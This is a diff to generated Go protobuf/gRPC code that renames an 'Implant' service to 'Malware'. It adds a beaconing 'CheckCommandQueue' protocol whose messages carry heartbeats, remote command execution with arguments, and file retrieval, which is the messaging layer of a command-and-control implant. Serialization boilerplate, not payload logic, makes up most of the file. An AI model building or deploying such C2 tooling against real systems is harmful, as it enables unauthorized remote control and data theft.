@@ -26,6 +26,7 @@ const _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package
 
 type ExecRequest struct {
 	Cmd                  string   `protobuf:"bytes,1,opt,name=cmd,proto3" json:"cmd,omitempty"`
+	Args                 []string `protobuf:"bytes,2,rep,name=args,proto3" json:"args,omitempty"`
 	XXX_NoUnkeyedLiteral struct{} `json:"-"`
 	XXX_unrecognized     []byte   `json:"-"`
 	XXX_sizecache        int32    `json:"-"`
@@ -61,6 +62,13 @@ func (m *ExecRequest) GetCmd() string {
 		return m.Cmd
 	}
 	return ""
+}
+
+func (m *ExecRequest) GetArgs() []string {
+	if m != nil {
+		return m.Args
+	}
+	return nil
 }
 
 type ExecReply struct {
@@ -102,24 +110,307 @@ func (m *ExecReply) GetReply() string {
 	return ""
 }
 
+type FileRequest struct {
+	Filename             string   `protobuf:"bytes,1,opt,name=filename,proto3" json:"filename,omitempty"`
+	XXX_NoUnkeyedLiteral struct{} `json:"-"`
+	XXX_unrecognized     []byte   `json:"-"`
+	XXX_sizecache        int32    `json:"-"`
+}
+
+func (m *FileRequest) Reset()         { *m = FileRequest{} }
+func (m *FileRequest) String() string { return proto.CompactTextString(m) }
+func (*FileRequest) ProtoMessage()    {}
+func (*FileRequest) Descriptor() ([]byte, []int) {
+	return fileDescriptor_8a23ab92aaff7b7b, []int{2}
+}
+
+func (m *FileRequest) XXX_Unmarshal(b []byte) error {
+	return xxx_messageInfo_FileRequest.Unmarshal(m, b)
+}
+func (m *FileRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	return xxx_messageInfo_FileRequest.Marshal(b, m, deterministic)
+}
+func (m *FileRequest) XXX_Merge(src proto.Message) {
+	xxx_messageInfo_FileRequest.Merge(m, src)
+}
+func (m *FileRequest) XXX_Size() int {
+	return xxx_messageInfo_FileRequest.Size(m)
+}
+func (m *FileRequest) XXX_DiscardUnknown() {
+	xxx_messageInfo_FileRequest.DiscardUnknown(m)
+}
+
+var xxx_messageInfo_FileRequest proto.InternalMessageInfo
+
+func (m *FileRequest) GetFilename() string {
+	if m != nil {
+		return m.Filename
+	}
+	return ""
+}
+
+type FileReply struct {
+	File                 string   `protobuf:"bytes,1,opt,name=file,proto3" json:"file,omitempty"`
+	XXX_NoUnkeyedLiteral struct{} `json:"-"`
+	XXX_unrecognized     []byte   `json:"-"`
+	XXX_sizecache        int32    `json:"-"`
+}
+
+func (m *FileReply) Reset()         { *m = FileReply{} }
+func (m *FileReply) String() string { return proto.CompactTextString(m) }
+func (*FileReply) ProtoMessage()    {}
+func (*FileReply) Descriptor() ([]byte, []int) {
+	return fileDescriptor_8a23ab92aaff7b7b, []int{3}
+}
+
+func (m *FileReply) XXX_Unmarshal(b []byte) error {
+	return xxx_messageInfo_FileReply.Unmarshal(m, b)
+}
+func (m *FileReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	return xxx_messageInfo_FileReply.Marshal(b, m, deterministic)
+}
+func (m *FileReply) XXX_Merge(src proto.Message) {
+	xxx_messageInfo_FileReply.Merge(m, src)
+}
+func (m *FileReply) XXX_Size() int {
+	return xxx_messageInfo_FileReply.Size(m)
+}
+func (m *FileReply) XXX_DiscardUnknown() {
+	xxx_messageInfo_FileReply.DiscardUnknown(m)
+}
+
+var xxx_messageInfo_FileReply proto.InternalMessageInfo
+
+func (m *FileReply) GetFile() string {
+	if m != nil {
+		return m.File
+	}
+	return ""
+}
+
+type CheckCmdRequest struct {
+	// Types that are valid to be assigned to Message:
+	//	*CheckCmdRequest_Heartbeat
+	//	*CheckCmdRequest_Exec
+	//	*CheckCmdRequest_File
+	Message              isCheckCmdRequest_Message `protobuf_oneof:"message"`
+	XXX_NoUnkeyedLiteral struct{}                  `json:"-"`
+	XXX_unrecognized     []byte                    `json:"-"`
+	XXX_sizecache        int32                     `json:"-"`
+}
+
+func (m *CheckCmdRequest) Reset()         { *m = CheckCmdRequest{} }
+func (m *CheckCmdRequest) String() string { return proto.CompactTextString(m) }
+func (*CheckCmdRequest) ProtoMessage()    {}
+func (*CheckCmdRequest) Descriptor() ([]byte, []int) {
+	return fileDescriptor_8a23ab92aaff7b7b, []int{4}
+}
+
+func (m *CheckCmdRequest) XXX_Unmarshal(b []byte) error {
+	return xxx_messageInfo_CheckCmdRequest.Unmarshal(m, b)
+}
+func (m *CheckCmdRequest) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	return xxx_messageInfo_CheckCmdRequest.Marshal(b, m, deterministic)
+}
+func (m *CheckCmdRequest) XXX_Merge(src proto.Message) {
+	xxx_messageInfo_CheckCmdRequest.Merge(m, src)
+}
+func (m *CheckCmdRequest) XXX_Size() int {
+	return xxx_messageInfo_CheckCmdRequest.Size(m)
+}
+func (m *CheckCmdRequest) XXX_DiscardUnknown() {
+	xxx_messageInfo_CheckCmdRequest.DiscardUnknown(m)
+}
+
+var xxx_messageInfo_CheckCmdRequest proto.InternalMessageInfo
+
+type isCheckCmdRequest_Message interface {
+	isCheckCmdRequest_Message()
+}
+
+type CheckCmdRequest_Heartbeat struct {
+	Heartbeat int64 `protobuf:"varint,1,opt,name=heartbeat,proto3,oneof"`
+}
+
+type CheckCmdRequest_Exec struct {
+	Exec *ExecReply `protobuf:"bytes,2,opt,name=exec,proto3,oneof"`
+}
+
+type CheckCmdRequest_File struct {
+	File *FileReply `protobuf:"bytes,3,opt,name=file,proto3,oneof"`
+}
+
+func (*CheckCmdRequest_Heartbeat) isCheckCmdRequest_Message() {}
+
+func (*CheckCmdRequest_Exec) isCheckCmdRequest_Message() {}
+
+func (*CheckCmdRequest_File) isCheckCmdRequest_Message() {}
+
+func (m *CheckCmdRequest) GetMessage() isCheckCmdRequest_Message {
+	if m != nil {
+		return m.Message
+	}
+	return nil
+}
+
+func (m *CheckCmdRequest) GetHeartbeat() int64 {
+	if x, ok := m.GetMessage().(*CheckCmdRequest_Heartbeat); ok {
+		return x.Heartbeat
+	}
+	return 0
+}
+
+func (m *CheckCmdRequest) GetExec() *ExecReply {
+	if x, ok := m.GetMessage().(*CheckCmdRequest_Exec); ok {
+		return x.Exec
+	}
+	return nil
+}
+
+func (m *CheckCmdRequest) GetFile() *FileReply {
+	if x, ok := m.GetMessage().(*CheckCmdRequest_File); ok {
+		return x.File
+	}
+	return nil
+}
+
+// XXX_OneofWrappers is for the internal use of the proto package.
+func (*CheckCmdRequest) XXX_OneofWrappers() []interface{} {
+	return []interface{}{
+		(*CheckCmdRequest_Heartbeat)(nil),
+		(*CheckCmdRequest_Exec)(nil),
+		(*CheckCmdRequest_File)(nil),
+	}
+}
+
+type CheckCmdReply struct {
+	// Types that are valid to be assigned to Message:
+	//	*CheckCmdReply_Heartbeat
+	//	*CheckCmdReply_Exec
+	//	*CheckCmdReply_File
+	Message              isCheckCmdReply_Message `protobuf_oneof:"message"`
+	XXX_NoUnkeyedLiteral struct{}                `json:"-"`
+	XXX_unrecognized     []byte                  `json:"-"`
+	XXX_sizecache        int32                   `json:"-"`
+}
+
+func (m *CheckCmdReply) Reset()         { *m = CheckCmdReply{} }
+func (m *CheckCmdReply) String() string { return proto.CompactTextString(m) }
+func (*CheckCmdReply) ProtoMessage()    {}
+func (*CheckCmdReply) Descriptor() ([]byte, []int) {
+	return fileDescriptor_8a23ab92aaff7b7b, []int{5}
+}
+
+func (m *CheckCmdReply) XXX_Unmarshal(b []byte) error {
+	return xxx_messageInfo_CheckCmdReply.Unmarshal(m, b)
+}
+func (m *CheckCmdReply) XXX_Marshal(b []byte, deterministic bool) ([]byte, error) {
+	return xxx_messageInfo_CheckCmdReply.Marshal(b, m, deterministic)
+}
+func (m *CheckCmdReply) XXX_Merge(src proto.Message) {
+	xxx_messageInfo_CheckCmdReply.Merge(m, src)
+}
+func (m *CheckCmdReply) XXX_Size() int {
+	return xxx_messageInfo_CheckCmdReply.Size(m)
+}
+func (m *CheckCmdReply) XXX_DiscardUnknown() {
+	xxx_messageInfo_CheckCmdReply.DiscardUnknown(m)
+}
+
+var xxx_messageInfo_CheckCmdReply proto.InternalMessageInfo
+
+type isCheckCmdReply_Message interface {
+	isCheckCmdReply_Message()
+}
+
+type CheckCmdReply_Heartbeat struct {
+	Heartbeat int64 `protobuf:"varint,1,opt,name=heartbeat,proto3,oneof"`
+}
+
+type CheckCmdReply_Exec struct {
+	Exec *ExecRequest `protobuf:"bytes,2,opt,name=exec,proto3,oneof"`
+}
+
+type CheckCmdReply_File struct {
+	File *FileRequest `protobuf:"bytes,3,opt,name=file,proto3,oneof"`
+}
+
+func (*CheckCmdReply_Heartbeat) isCheckCmdReply_Message() {}
+
+func (*CheckCmdReply_Exec) isCheckCmdReply_Message() {}
+
+func (*CheckCmdReply_File) isCheckCmdReply_Message() {}
+
+func (m *CheckCmdReply) GetMessage() isCheckCmdReply_Message {
+	if m != nil {
+		return m.Message
+	}
+	return nil
+}
+
+func (m *CheckCmdReply) GetHeartbeat() int64 {
+	if x, ok := m.GetMessage().(*CheckCmdReply_Heartbeat); ok {
+		return x.Heartbeat
+	}
+	return 0
+}
+
+func (m *CheckCmdReply) GetExec() *ExecRequest {
+	if x, ok := m.GetMessage().(*CheckCmdReply_Exec); ok {
+		return x.Exec
+	}
+	return nil
+}
+
+func (m *CheckCmdReply) GetFile() *FileRequest {
+	if x, ok := m.GetMessage().(*CheckCmdReply_File); ok {
+		return x.File
+	}
+	return nil
+}
+
+// XXX_OneofWrappers is for the internal use of the proto package.
+func (*CheckCmdReply) XXX_OneofWrappers() []interface{} {
+	return []interface{}{
+		(*CheckCmdReply_Heartbeat)(nil),
+		(*CheckCmdReply_Exec)(nil),
+		(*CheckCmdReply_File)(nil),
+	}
+}
+
 func init() {
 	proto.RegisterType((*ExecRequest)(nil), "messages.ExecRequest")
 	proto.RegisterType((*ExecReply)(nil), "messages.ExecReply")
+	proto.RegisterType((*FileRequest)(nil), "messages.FileRequest")
+	proto.RegisterType((*FileReply)(nil), "messages.FileReply")
+	proto.RegisterType((*CheckCmdRequest)(nil), "messages.CheckCmdRequest")
+	proto.RegisterType((*CheckCmdReply)(nil), "messages.CheckCmdReply")
 }
 
 func init() { proto.RegisterFile("common/messages/messages.proto", fileDescriptor_8a23ab92aaff7b7b) }
 
 var fileDescriptor_8a23ab92aaff7b7b = []byte{
-	// 141 bytes of a gzipped FileDescriptorProto
-	0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0xe2, 0x92, 0x4b, 0xce, 0xcf, 0xcd,
-	0xcd, 0xcf, 0xd3, 0xcf, 0x4d, 0x2d, 0x2e, 0x4e, 0x4c, 0x4f, 0x2d, 0x86, 0x33, 0xf4, 0x0a, 0x8a,
-	0xf2, 0x4b, 0xf2, 0x85, 0x38, 0x60, 0x7c, 0x25, 0x79, 0x2e, 0x6e, 0xd7, 0x8a, 0xd4, 0xe4, 0xa0,
-	0xd4, 0xc2, 0xd2, 0xd4, 0xe2, 0x12, 0x21, 0x01, 0x2e, 0xe6, 0xe4, 0xdc, 0x14, 0x09, 0x46, 0x05,
-	0x46, 0x0d, 0xce, 0x20, 0x10, 0x53, 0x49, 0x91, 0x8b, 0x13, 0xa2, 0xa0, 0x20, 0xa7, 0x52, 0x48,
-	0x84, 0x8b, 0xb5, 0x08, 0xc4, 0x80, 0x2a, 0x80, 0x70, 0x8c, 0xec, 0xb9, 0xd8, 0x3d, 0x73, 0x0b,
-	0x72, 0x12, 0xf3, 0x4a, 0x84, 0x4c, 0xb8, 0x58, 0x40, 0xaa, 0x85, 0x44, 0xf5, 0xe0, 0x36, 0x22,
-	0x19, 0x2f, 0x25, 0x8c, 0x2e, 0x5c, 0x90, 0x53, 0xa9, 0xc4, 0x90, 0xc4, 0x06, 0x76, 0x95, 0x31,
-	0x20, 0x00, 0x00, 0xff, 0xff, 0xd3, 0x69, 0x95, 0x6a, 0xb7, 0x00, 0x00, 0x00,
+	// 312 bytes of a gzipped FileDescriptorProto
+	0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0xff, 0x84, 0x92, 0xcf, 0x4e, 0x83, 0x40,
+	0x10, 0x87, 0x4b, 0x41, 0xdb, 0x1d, 0x62, 0xd4, 0xd5, 0x46, 0xec, 0xa1, 0xe2, 0x9e, 0x68, 0x9a,
+	0xd4, 0xa4, 0x7d, 0x03, 0x1b, 0x4d, 0x3d, 0x78, 0x90, 0xf8, 0x02, 0x5b, 0x18, 0xdb, 0x46, 0x16,
+	0x2a, 0x7f, 0x62, 0x7d, 0x0d, 0xe3, 0x03, 0x9b, 0x5d, 0x60, 0x49, 0x89, 0x89, 0xb7, 0xdf, 0x30,
+	0xdf, 0x0e, 0x1f, 0xc3, 0xc2, 0x28, 0x48, 0x84, 0x48, 0xe2, 0x3b, 0x81, 0x59, 0xc6, 0xd7, 0x98,
+	0xe9, 0x30, 0xdd, 0xa5, 0x49, 0x9e, 0xd0, 0x7e, 0x5d, 0xb3, 0x39, 0xd8, 0x0f, 0x7b, 0x0c, 0x7c,
+	0xfc, 0x28, 0x30, 0xcb, 0xe9, 0x19, 0x98, 0x81, 0x08, 0x1d, 0xc3, 0x35, 0x3c, 0xe2, 0xcb, 0x48,
+	0x29, 0x58, 0x3c, 0x5d, 0x67, 0x4e, 0xd7, 0x35, 0x3d, 0xe2, 0xab, 0xcc, 0x6e, 0x81, 0x94, 0x87,
+	0x76, 0xd1, 0x17, 0xbd, 0x84, 0xa3, 0x54, 0x86, 0xea, 0x50, 0x59, 0xb0, 0x31, 0xd8, 0x8f, 0xdb,
+	0x08, 0xeb, 0xb9, 0x43, 0xe8, 0xbf, 0x6d, 0x23, 0x8c, 0xb9, 0xc0, 0x8a, 0xd3, 0x35, 0xbb, 0x01,
+	0x52, 0xa2, 0x72, 0x1a, 0x05, 0x4b, 0x36, 0x2a, 0x48, 0x65, 0xf6, 0x6d, 0xc0, 0xe9, 0x62, 0x83,
+	0xc1, 0xfb, 0x42, 0x84, 0xf5, 0xc0, 0x11, 0x90, 0x0d, 0xf2, 0x34, 0x5f, 0x21, 0xcf, 0x15, 0x6c,
+	0x2e, 0x3b, 0x7e, 0xf3, 0x88, 0x8e, 0xc1, 0xc2, 0x3d, 0x06, 0x4e, 0xd7, 0x35, 0x3c, 0x7b, 0x76,
+	0x31, 0xd5, 0x0b, 0xd0, 0xe2, 0xcb, 0x8e, 0xaf, 0x10, 0x89, 0xaa, 0x57, 0x9a, 0x6d, 0x54, 0x5b,
+	0x49, 0x54, 0x22, 0xf7, 0x04, 0x7a, 0x55, 0x97, 0xfd, 0x18, 0x70, 0xd2, 0x48, 0x49, 0xf5, 0xff,
+	0x94, 0x26, 0x07, 0x4a, 0x83, 0xb6, 0x92, 0xfa, 0x2e, 0x2d, 0x35, 0x39, 0x90, 0x1a, 0xb4, 0xa5,
+	0x34, 0xdc, 0xd2, 0x9a, 0xbd, 0x42, 0xef, 0x99, 0x47, 0x9f, 0x3c, 0x45, 0xfa, 0x04, 0xe7, 0xa5,
+	0x60, 0x22, 0x04, 0x8f, 0xc3, 0x97, 0x02, 0x0b, 0xa4, 0xd7, 0xcd, 0xa4, 0xd6, 0x4a, 0x87, 0x57,
+	0x7f, 0xb5, 0xe4, 0xbf, 0xec, 0xac, 0x8e, 0xd5, 0xb5, 0x99, 0xff, 0x06, 0x00, 0x00, 0xff, 0xff,
+	0xff, 0xcf, 0x06, 0xd2, 0x58, 0x02, 0x00, 0x00,
 }
 
 // Reference imports to suppress errors if they are not otherwise used.
@@ -130,72 +421,72 @@ var _ grpc.ClientConn
 // is compatible with the grpc package it is being compiled against.
 const _ = grpc.SupportPackageIsVersion4
 
-// ImplantClient is the client API for Implant service.
+// MalwareClient is the client API for Malware service.
 //
 // For semantics around ctx use and closing/ending streaming RPCs, please refer to https://godoc.org/google.golang.org/grpc#ClientConn.NewStream.
-type ImplantClient interface {
-	Exec(ctx context.Context, in *ExecRequest, opts ...grpc.CallOption) (*ExecReply, error)
+type MalwareClient interface {
+	CheckCommandQueue(ctx context.Context, in *CheckCmdRequest, opts ...grpc.CallOption) (*CheckCmdReply, error)
 }
 
-type implantClient struct {
+type malwareClient struct {
 	cc *grpc.ClientConn
 }
 
-func NewImplantClient(cc *grpc.ClientConn) ImplantClient {
-	return &implantClient{cc}
+func NewMalwareClient(cc *grpc.ClientConn) MalwareClient {
+	return &malwareClient{cc}
 }
 
-func (c *implantClient) Exec(ctx context.Context, in *ExecRequest, opts ...grpc.CallOption) (*ExecReply, error) {
-	out := new(ExecReply)
-	err := c.cc.Invoke(ctx, "/messages.Implant/Exec", in, out, opts...)
+func (c *malwareClient) CheckCommandQueue(ctx context.Context, in *CheckCmdRequest, opts ...grpc.CallOption) (*CheckCmdReply, error) {
+	out := new(CheckCmdReply)
+	err := c.cc.Invoke(ctx, "/messages.Malware/CheckCommandQueue", in, out, opts...)
 	if err != nil {
 		return nil, err
 	}
 	return out, nil
 }
 
-// ImplantServer is the server API for Implant service.
-type ImplantServer interface {
-	Exec(context.Context, *ExecRequest) (*ExecReply, error)
+// MalwareServer is the server API for Malware service.
+type MalwareServer interface {
+	CheckCommandQueue(context.Context, *CheckCmdRequest) (*CheckCmdReply, error)
 }
 
-// UnimplementedImplantServer can be embedded to have forward compatible implementations.
-type UnimplementedImplantServer struct {
+// UnimplementedMalwareServer can be embedded to have forward compatible implementations.
+type UnimplementedMalwareServer struct {
 }
 
-func (*UnimplementedImplantServer) Exec(ctx context.Context, req *ExecRequest) (*ExecReply, error) {
-	return nil, status.Errorf(codes.Unimplemented, "method Exec not implemented")
+func (*UnimplementedMalwareServer) CheckCommandQueue(ctx context.Context, req *CheckCmdRequest) (*CheckCmdReply, error) {
+	return nil, status.Errorf(codes.Unimplemented, "method CheckCommandQueue not implemented")
 }
 
-func RegisterImplantServer(s *grpc.Server, srv ImplantServer) {
-	s.RegisterService(&_Implant_serviceDesc, srv)
+func RegisterMalwareServer(s *grpc.Server, srv MalwareServer) {
+	s.RegisterService(&_Malware_serviceDesc, srv)
 }
 
-func _Implant_Exec_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
-	in := new(ExecRequest)
+func _Malware_CheckCommandQueue_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) {
+	in := new(CheckCmdRequest)
 	if err := dec(in); err != nil {
 		return nil, err
 	}
 	if interceptor == nil {
-		return srv.(ImplantServer).Exec(ctx, in)
+		return srv.(MalwareServer).CheckCommandQueue(ctx, in)
 	}
 	info := &grpc.UnaryServerInfo{
 		Server:     srv,
-		FullMethod: "/messages.Implant/Exec",
+		FullMethod: "/messages.Malware/CheckCommandQueue",
 	}
 	handler := func(ctx context.Context, req interface{}) (interface{}, error) {
-		return srv.(ImplantServer).Exec(ctx, req.(*ExecRequest))
+		return srv.(MalwareServer).CheckCommandQueue(ctx, req.(*CheckCmdRequest))
 	}
 	return interceptor(ctx, in, info, handler)
 }
 
-var _Implant_serviceDesc = grpc.ServiceDesc{
-	ServiceName: "messages.Implant",
-	HandlerType: (*ImplantServer)(nil),
+var _Malware_serviceDesc = grpc.ServiceDesc{
+	ServiceName: "messages.Malware",
+	HandlerType: (*MalwareServer)(nil),
 	Methods: []grpc.MethodDesc{
 		{
-			MethodName: "Exec",
-			Handler:    _Implant_Exec_Handler,
+			MethodName: "CheckCommandQueue",
+			Handler:    _Malware_CheckCommandQueue_Handler,
 		},
 	},
 	Streams:  []grpc.StreamDesc{},
